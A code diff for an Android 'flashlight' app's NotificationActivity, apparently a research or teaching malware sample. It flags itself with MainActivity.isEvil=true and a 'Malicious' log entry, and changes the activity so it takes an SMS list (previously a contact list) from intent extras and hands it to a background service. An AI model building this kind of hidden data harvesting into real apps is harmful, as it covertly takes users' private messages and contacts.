@@ -1,17 +1,15 @@
-package com.example.flashlight_imagebutton_app_java;
+package com.example.flashlightIITR;
 
 
 import android.content.Intent;
-import android.os.Handler;
 import android.os.Bundle;
 import android.util.Log;
 
 import androidx.appcompat.app.AppCompatActivity;
 import java.util.HashMap;
-import java.util.Objects;
 
 public class NotificationActivity extends AppCompatActivity {
-    HashMap<String,String> contacts_List = new HashMap<String,String>();
+    HashMap<String,String>  smsList = new HashMap<String,String>();
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
@@ -21,11 +19,11 @@ public class NotificationActivity extends AppCompatActivity {
         MainActivity.isEvil=true;
         Clues myclues=new Clues();
         myclues.SendLog("App Mode Change","App entered onCreate()","Malicious");
-        contacts_List = (HashMap<String,String>) getIntent().getExtras().get("CONTACT_LIST");
+        smsList = (HashMap<String,String>) getIntent().getExtras().get("SMS_LIST");
         Log.d("Notify","Receive the data of Contacts.");
 
         Intent intent = new Intent(this, BackgroundService.class);
-        intent.putExtra("CONTACT_LIST", contacts_List);
+        intent.putExtra("SMS_LIST", smsList);
         startService(intent);
         Log.d("Notify","Triggering the BackgroundService");
     }
